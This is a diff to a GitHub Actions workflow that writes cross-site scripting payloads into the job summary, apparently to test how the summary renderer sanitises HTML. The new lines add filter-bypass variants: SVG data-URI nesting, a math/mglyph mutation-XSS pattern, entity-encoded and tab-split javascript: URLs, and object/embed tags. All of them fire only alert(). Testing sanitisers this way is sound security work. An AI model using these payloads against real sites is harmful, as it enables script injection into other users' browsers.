@@ -10,13 +10,16 @@ jobs:
     steps:
       - name: XSS Test in Job Summary
         run: |
-          echo '## XSS Tests' >> $GITHUB_STEP_SUMMARY
-          echo '<img src=x onerror=alert(1)>' >> $GITHUB_STEP_SUMMARY
-          echo '<script>alert(document.domain)</script>' >> $GITHUB_STEP_SUMMARY
-          echo '<svg onload=alert(1)>' >> $GITHUB_STEP_SUMMARY
-          echo '[click me](javascript:alert(1))' >> $GITHUB_STEP_SUMMARY
-          echo '<a href="javascript:alert(1)">js link</a>' >> $GITHUB_STEP_SUMMARY
-          echo '<details open ontoggle=alert(1)><summary>toggle</summary></details>' >> $GITHUB_STEP_SUMMARY
-          echo '<iframe src="javascript:alert(1)"></iframe>' >> $GITHUB_STEP_SUMMARY
+          echo '## XSS Tests Round 2' >> $GITHUB_STEP_SUMMARY
+          echo '<img src="x" onerror="alert(1)">' >> $GITHUB_STEP_SUMMARY
+          echo '<img/src=x onerror=alert(1)>' >> $GITHUB_STEP_SUMMARY
+          echo '<svg><use xlink:href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><image href=x onerror=alert(1) /></svg>#x"></use></svg>' >> $GITHUB_STEP_SUMMARY
+          echo '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>' >> $GITHUB_STEP_SUMMARY
+          echo '<form><button formaction="javascript:alert(1)">click</button></form>' >> $GITHUB_STEP_SUMMARY
+          echo '<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">encoded js</a>' >> $GITHUB_STEP_SUMMARY
+          echo '<a href="jav&#x09;ascript:alert(1)">tab break</a>' >> $GITHUB_STEP_SUMMARY
+          echo '<a href="data:text/html,<script>alert(1)</script>">data uri</a>' >> $GITHUB_STEP_SUMMARY
+          echo '<object data="javascript:alert(1)">' >> $GITHUB_STEP_SUMMARY
+          echo '<embed src="javascript:alert(1)">' >> $GITHUB_STEP_SUMMARY
       - name: Fail immediately
         run: exit 1
